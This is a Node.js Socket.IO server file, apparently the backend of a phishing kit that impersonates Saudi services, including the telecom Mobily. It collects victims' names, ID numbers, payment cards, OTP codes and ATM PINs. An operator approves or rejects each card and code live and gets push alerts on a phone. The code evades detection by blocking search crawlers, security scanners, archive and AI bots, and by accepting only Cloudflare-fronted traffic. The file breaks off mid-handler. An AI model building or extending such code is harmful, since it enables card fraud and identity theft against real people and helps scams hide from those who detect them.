const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

// Firebase Admin SDK for push notifications
let firebaseAdmin = null;
try {
  firebaseAdmin = require("firebase-admin");
  // Try to load service account from environment variable first, then from file
  let serviceAccount;
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
  } else if (fs.existsSync(path.join(__dirname, 'serviceAccountKey.json'))) {
    serviceAccount = require('./serviceAccountKey.json');
  }
  if (serviceAccount) {
    firebaseAdmin.initializeApp({
      credential: firebaseAdmin.credential.cert(serviceAccount)
    });
    console.log('Firebase Admin SDK initialized successfully');
  } else {
    console.log('Firebase service account not found - push notifications disabled');
    firebaseAdmin = null;
  }
} catch (error) {
  console.log('Firebase Admin SDK not available:', error.message);
  firebaseAdmin = null;
}

// Store FCM tokens for admin devices
const FCM_TOKENS_FILE = path.join(process.env.NODE_ENV === 'production' ? '/data' : __dirname, 'fcm_tokens.json');
let fcmTokens = [];
try {
  if (fs.existsSync(FCM_TOKENS_FILE)) {
    fcmTokens = JSON.parse(fs.readFileSync(FCM_TOKENS_FILE, 'utf8'));
    console.log(`Loaded ${fcmTokens.length} FCM tokens`);
  }
} catch (e) {
  console.log('No FCM tokens file found, starting fresh');
}

function saveFcmTokens() {
  try {
    const dir = path.dirname(FCM_TOKENS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(FCM_TOKENS_FILE, JSON.stringify(fcmTokens));
  } catch (e) {
    console.error('Error saving FCM tokens:', e.message);
  }
}

// Send push notification to all registered admin devices
async function sendPushNotification(title, body, data = {}) {
  if (!firebaseAdmin || fcmTokens.length === 0) {
    console.log(`Push skipped: firebase=${!!firebaseAdmin}, tokens=${fcmTokens.length}`);
    return;
  }
  
  console.log(`Sending push to ${fcmTokens.length} devices: ${title}`);
  const invalidTokens = [];
  
  for (const token of fcmTokens) {
    try {
      const message = {
        token: token,
        notification: {
          title: title,
          body: body,
        },
        data: {
          ...Object.fromEntries(Object.entries(data).map(([k, v]) => [k, String(v)])),
          timestamp: Date.now().toString()
        },
        webpush: {
          headers: {
            Urgency: 'high',
            TTL: '86400'
          },
          notification: {
            icon: '/admin/icon-192.png',
            badge: '/admin/icon-192.png',
            tag: 'visitor-data-' + Date.now(),
            renotify: true,
            requireInteraction: true,
            vibrate: [300, 100, 300, 100, 300],
          },
          fcmOptions: {
            link: 'https://fahos-production.up.railway.app/admin/'
          }
        },
        apns: {
          headers: {
            'apns-priority': '10',
            'apns-push-type': 'alert'
          },
          payload: {
            aps: {
              alert: {
                title: title,
                body: body
              },
              sound: 'default',
              badge: 1,
              'mutable-content': 1,
              'content-available': 1
            }
          }
        }
      };
      
      const result = await firebaseAdmin.messaging().send(message);
      console.log(`Push sent OK to ${token.substring(0, 20)}..., result: ${result}`);
    } catch (error) {
      console.error(`Push ERROR to ${token.substring(0, 20)}...: ${error.code} - ${error.message}`);
      if (error.code === 'messaging/registration-token-not-registered' || 
          error.code === 'messaging/invalid-registration-token') {
        invalidTokens.push(token);
      }
    }
  }
  
  // Remove invalid tokens
  if (invalidTokens.length > 0) {
    fcmTokens = fcmTokens.filter(t => !invalidTokens.includes(t));
    saveFcmTokens();
    console.log(`Removed ${invalidTokens.length} invalid FCM tokens`);
  }
}

const app = express();
const server = http.createServer(app);

// CORS Configuration - Dynamic (reads from allowedDomains)
const corsOptions = {
  origin: function (origin, callback) {
    if (!origin) return callback(null, true); // Allow requests with no origin (like server-to-server)
    const allowed = buildAllowedOrigins();
    if (allowed.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(cookieParser());

// Rate Limiting - block IPs with too many requests
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 100; // max requests per window
const RATE_LIMIT_BLOCK_DURATION = 10 * 60 * 1000; // block for 10 minutes

setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of rateLimitMap) {
    if (now - data.firstRequest > RATE_LIMIT_WINDOW && !data.blocked) {
      rateLimitMap.delete(ip);
    }
    if (data.blocked && now > data.blockedUntil) {
      rateLimitMap.delete(ip);
    }
  }
}, 60 * 1000);

app.use((req, res, next) => {
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
  const now = Date.now();
  let data = rateLimitMap.get(ip);
  
  if (data && data.blocked) {
    if (now < data.blockedUntil) {
      return res.status(429).send('Too many requests. Try again later.');
    } else {
      rateLimitMap.delete(ip);
      data = null;
    }
  }
  
  if (!data) {
    rateLimitMap.set(ip, { count: 1, firstRequest: now, blocked: false });
  } else {
    if (now - data.firstRequest > RATE_LIMIT_WINDOW) {
      rateLimitMap.set(ip, { count: 1, firstRequest: now, blocked: false });
    } else {
      data.count++;
      if (data.count > RATE_LIMIT_MAX) {
        data.blocked = true;
        data.blockedUntil = now + RATE_LIMIT_BLOCK_DURATION;
        return res.status(429).send('Too many requests. Try again later.');
      }
    }
  }
  next();
});

app.use('/admin', express.static('admin', {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.json')) res.setHeader('Content-Type', 'application/json');
    if (filePath.endsWith('.js') && filePath.includes('sw.js')) res.setHeader('Service-Worker-Allowed', '/');
  }
}));

// Cloudflare-only protection - block direct access to Railway (except admin panel)
app.use((req, res, next) => {
  // Allow admin panel access from Railway directly
  if (req.path.startsWith('/admin')) return next();
  // Allow FCM API endpoints (used by mobile PWA)
  if (req.path.startsWith('/api/fcm/')) return next();
  // Allow health checks
  if (req.path === '/health' || req.path === '/') return next();
  // In production, require Cloudflare headers
  if (process.env.NODE_ENV === 'production') {
    const cfIP = req.headers['cf-connecting-ip'];
    const cfRay = req.headers['cf-ray'];
    if (!cfIP && !cfRay) {
      console.log(`Blocked direct access (no Cloudflare headers): ${req.ip}, Path: ${req.path}`);
      return res.status(403).send('Access denied');
    }
  }
  next();
});

// Socket.IO Configuration
const io = new Server(server, {
  cors: {
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      const allowed = buildAllowedOrigins();
      if (allowed.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true,
  },
  transports: ["websocket", "polling"],
  allowRequest: (req, callback) => {
    const origin = req.headers.origin || req.headers.referer || '';
    const allowed = buildAllowedOrigins();
    const isAllowed = allowed.some(a => origin.startsWith(a));
    if (!origin || !isAllowed) {
      console.log(`Blocked request from origin: ${origin || 'no origin'}, IP: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}`);
      callback('Unauthorized', false);
    } else {
      callback(null, true);
    }
  },
});

// Data file path
const DATA_DIR = process.env.NODE_ENV === 'production' ? '/data' : __dirname;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
        allowedDomains: parsed.allowedDomains || null,
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
        allowedDomains: parsed.allowedDomains || null,
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
          allowedDomains: parsed.allowedDomains || null,
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
    allowedDomains: null,
  };
}

// Save data to file with backup - actual write function
function _saveDataNow() {
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      allowedDomains,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data, null, 2);
    
    // Create backup of existing file first
    if (fs.existsSync(DATA_FILE)) {
      try {
        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
      } catch (backupErr) {
        console.error("Error creating backup:", backupErr);
      }
    }
    
    // Write main file
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
  } catch (error) {
    console.error("Error saving data:", error);
  }
}

// Debounced saveData - writes at most once every 5 seconds
let _saveTimeout = null;
function saveData() {
  if (_saveTimeout) return; // already scheduled
  _saveTimeout = setTimeout(() => {
    _saveDataNow();
    _saveTimeout = null;
  }, 5000);
}

// Force save on shutdown
process.on('SIGTERM', () => { if (_saveTimeout) { clearTimeout(_saveTimeout); _saveDataNow(); } process.exit(0); });
process.on('SIGINT', () => { if (_saveTimeout) { clearTimeout(_saveTimeout); _saveDataNow(); } process.exit(0); });

// Initialize data from file
const savedData = loadSavedData();
const visitors = savedData.visitors;
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)

// Default allowed domains
const DEFAULT_ALLOWED_DOMAINS = [
  'alamsallameh.com',
  'amnwsalameh.com',
  'amansallameh.com',
];
let allowedDomains = savedData.allowedDomains || [...DEFAULT_ALLOWED_DOMAINS]; // Allowed domains (persisted)

// Build full origins list from allowed domains
function buildAllowedOrigins() {
  const origins = [];
  allowedDomains.forEach(domain => {
    origins.push(`https://${domain}`);
    origins.push(`https://www.${domain}`);
  });
  // Always allow Railway admin and localhost
  origins.push('https://fahos-production.up.railway.app');
  origins.push('http://localhost:5173');
  origins.push('http://localhost');
  return origins;
}

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the last IP from x-forwarded-for (the external/public IP)
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[ips.length - 1]; // Use the last IP (external)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Check if user agent is a bot or crawler - COMPREHENSIVE BLOCKING
function isBot(ua) {
  if (!ua) return true; // No user agent = bot
  const lowerUA = ua.toLowerCase();
  const botPatterns = [
    'bot', 'crawl', 'spider', 'slurp', 'scrape', 'fetch',
    'curl', 'wget', 'python', 'java/', 'perl', 'ruby',
    'php/', 'go-http', 'node-fetch', 'axios', 'request',
    'postman', 'insomnia', 'httpie',
    'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduck',
    'facebookexternalhit', 'twitterbot', 'linkedinbot',
    'whatsapp', 'telegram', 'discord', 'slack',
    'semrush', 'ahrefs', 'mj12bot', 'dotbot', 'rogerbot',
    'screaming frog', 'lighthouse', 'pagespeed', 'gtmetrix',
    'headlesschrome', 'phantomjs', 'selenium', 'puppeteer', 'playwright',
    'archive.org', 'ia_archiver',
    'uptimerobot', 'pingdom', 'statuscake', 'site24x7',
    'applebot', 'bytespider', 'gptbot', 'chatgpt', 'claudebot',
    'ccbot', 'anthropic', 'cohere-ai',
  ];
  return botPatterns.some(pattern => lowerUA.includes(pattern));
}

// Validate that visitor has a real browser user agent
function isValidVisitor(ua) {
  if (!ua) return false;
  // Must contain at least one real browser identifier
  const browserPatterns = ['mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera', 'samsung'];
  const lowerUA = ua.toLowerCase();
  const hasBrowser = browserPatterns.some(b => lowerUA.includes(b));
  // Must not be a bot
  return hasBrowser && !isBot(ua);
}

// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// === Anti-Bot Protection ===
// Track connections per IP (max 5 concurrent connections per IP)
const ipConnectionCount = new Map();
// Track new visitor registrations per minute (max 15 per minute globally)
let newVisitorTimestamps = [];
const MAX_CONNECTIONS_PER_IP = 5; // real user opens 1-2 tabs max
const MAX_NEW_VISITORS_PER_MINUTE = 15; // real visitors don't come 15+ per minute
const NEW_VISITOR_WINDOW = 60 * 1000; // 1 minute

// Clean up old timestamps every 30 seconds
setInterval(() => {
  const cutoff = Date.now() - NEW_VISITOR_WINDOW;
  newVisitorTimestamps = newVisitorTimestamps.filter(t => t > cutoff);
}, 30000);

// Block unauthorized WebSocket connections
io.use((socket, next) => {
  const origin = socket.handshake.headers.origin || socket.handshake.headers.referer || '';
  const allowedOrigins = buildAllowedOrigins();
  const isAllowed = allowedOrigins.some(allowed => origin.startsWith(allowed));
  
  if (!origin || !isAllowed) {
    console.log(`Blocked unauthorized connection from origin: ${origin || 'no origin'}, IP: ${socket.handshake.headers['x-forwarded-for'] || socket.handshake.address}`);
    return next(new Error('Unauthorized'));
  }
  
  // Cloudflare-only: Block direct WebSocket connections in production
  // Note: Allowed domains can connect directly (Vercel frontend -> Railway backend)
  // Only block unknown origins without Cloudflare headers
  if (process.env.NODE_ENV === 'production') {
    const cfIP = socket.handshake.headers['cf-connecting-ip'];
    const cfRay = socket.handshake.headers['cf-ray'];
    // Allow if: has Cloudflare headers OR origin is railway.app OR origin is in allowed domains
    if (!cfIP && !cfRay && !origin.includes('railway.app') && !isAllowed) {
      console.log(`Blocked direct WebSocket (no Cloudflare, not allowed): ${socket.handshake.address}`);
      return next(new Error('Direct access not allowed'));
    }
  }
  
  // Bot check on WebSocket connections
  const ua = socket.handshake.headers['user-agent'] || '';
  if (isBot(ua) || !isValidVisitor(ua)) {
    console.log(`Blocked bot WebSocket connection: UA=${ua}, IP=${socket.handshake.headers['x-forwarded-for'] || socket.handshake.address}`);
    return next(new Error('Bot detected'));
  }
  
  // Anti-Bot: Check connections per IP
  let ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.headers['cf-connecting-ip'] || socket.handshake.address;
  if (ip && ip.includes(',')) {
    ip = ip.split(',').map(i => i.trim()).pop();
  }
  
  const currentCount = ipConnectionCount.get(ip) || 0;
  if (currentCount >= MAX_CONNECTIONS_PER_IP) {
    console.log(`Anti-Bot: Blocked IP ${ip} - too many connections (${currentCount}/${MAX_CONNECTIONS_PER_IP})`);
    return next(new Error('Too many connections'));
  }
  
  // Track this connection
  ipConnectionCount.set(ip, currentCount + 1);
  socket._antiBot_ip = ip;
  
  // Decrease count on disconnect
  socket.on('disconnect', () => {
    const count = ipConnectionCount.get(socket._antiBot_ip) || 1;
    if (count <= 1) {
      ipConnectionCount.delete(socket._antiBot_ip);
    } else {
      ipConnectionCount.set(socket._antiBot_ip, count - 1);
    }
  });
  
  next();
});

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Handle visitor registration
  socket.on("visitor:register", (data) => {
    const visitorInfo = getVisitorInfo(socket);
    
    // Block bots and unknown visitors
    if (!isValidVisitor(visitorInfo.userAgent)) {
      console.log(`Blocked bot/unknown visitor: ${visitorInfo.ip}, UA: ${visitorInfo.userAgent}`);
      socket.disconnect();
      return;
    }
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Anti-Bot: Check if too many new visitors per minute
      const now_check = Date.now();
      const cutoff = now_check - NEW_VISITOR_WINDOW;
      newVisitorTimestamps = newVisitorTimestamps.filter(t => t > cutoff);
      if (newVisitorTimestamps.length >= MAX_NEW_VISITORS_PER_MINUTE) {
        console.log(`Anti-Bot: Blocked new visitor registration from IP ${visitorInfo.ip} - too many new visitors (${newVisitorTimestamps.length}/${MAX_NEW_VISITORS_PER_MINUTE} per minute)`);
        socket.disconnect();
        return;
      }
      newVisitorTimestamps.push(now_check);
      
      // Create new visitor
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        rejectedCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
    }

    visitors.set(socket.id, visitor);
    saveData();

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });
    // If visitor was blocked, re-send blocked event
    if (visitor.isBlocked) {
      socket.emit("blocked");
    }

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id });
      }
    });

  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
        });
      });
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Only update lastDataUpdate if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
      }
      if (data.paymentCard) {
        // Check if card was previously rejected by admin
        const newCardNumber = data.paymentCard.cardNumber;
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber);
        
        if (isAdminRejected) {
          // Card was rejected by admin before - auto reject
          socket.emit("card:duplicateRejected");
          // Reset waiting status since card was auto-rejected
          visitor.waitingForAdminResponse = false;
          visitor.lastDataUpdate = new Date().toISOString();
          // Save rejection permanently
          if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
          visitor.duplicateCardRejections.push({ cardNumber: newCardNumber, timestamp: new Date().toISOString() });
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          // Notify admins about auto-rejected card
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:duplicateCard", {
              visitorId: visitor._id,
              cardNumber: newCardNumber,
              visitor: visitor,
            });
          });
          console.log(`Admin-rejected card auto-rejected for visitor ${visitor._id}: ${newCardNumber}`);
          return; // Don't continue processing
        } else {
          const now = new Date().toISOString();
          visitor.paymentCards.push({
            ...data.paymentCard,
            timestamp: now,
          });
          // Start tracking from card page
          visitor.lastDataUpdate = now;
          visitor.hasEnteredCardPage = true;
        }
      }
      if (data.digitCode) {
        // Check for duplicate OTP code
        const isDuplicateCode = visitor.digitCodes && visitor.digitCodes.some(dc => dc.code === data.digitCode);
        if (isDuplicateCode && data.page !== "كلمة مرور ATM") {
          // Reject duplicate OTP - notify visitor
          socket.emit("otp:duplicateRejected");
          visitor.waitingForAdminResponse = false;
          visitor.lastDataUpdate = new Date().toISOString();
          // Save duplicate OTP rejection permanently
          if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
          visitor.duplicateOtpRejections.push({ code: data.digitCode, page: data.page, timestamp: new Date().toISOString() });
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          // Notify admins about duplicate OTP rejection
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:duplicateOtp", {
              visitorId: visitor._id,
              code: data.digitCode,
              page: data.page,
              visitor: visitor,
            });
          });
          console.log(`Duplicate OTP rejected for visitor ${visitor._id}: ${data.digitCode}`);
          return;
        }
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        // Only update if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });

      // Send push notification for new visitor data
      const pageName = data.page || visitor.page || '';
      const visitorNum = visitor.visitorNumber || '';
      sendPushNotification(
        `بيانات جديدة - زائر #${visitorNum}`,
        `${pageName}`,
        { visitorId: visitor._id, page: pageName }
      ).catch(err => console.error('Push notification error:', err));

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Check if card prefix is blocked
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        // Check if visitor is idle (no activity for 30 seconds)
        let isIdle = false;
        if (isCurrentlyConnected) {
          const activeVisitorArr = Array.from(visitors.values()).find(av => av._id === v._id);
          if (activeVisitorArr && activeVisitorArr.lastActivity) {
            isIdle = (Date.now() - activeVisitorArr.lastActivity) > 60000;
          }
        }
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected, isIdle };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus);

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    io.to(visitorSocketId).emit("form:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form approved for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const visitorSocketId = data.visitorSocketId || data;
    io.to(visitorSocketId).emit("form:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    io.to(visitorSocketId).emit("mobily:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    io.to(visitorSocketId).emit("code", code);
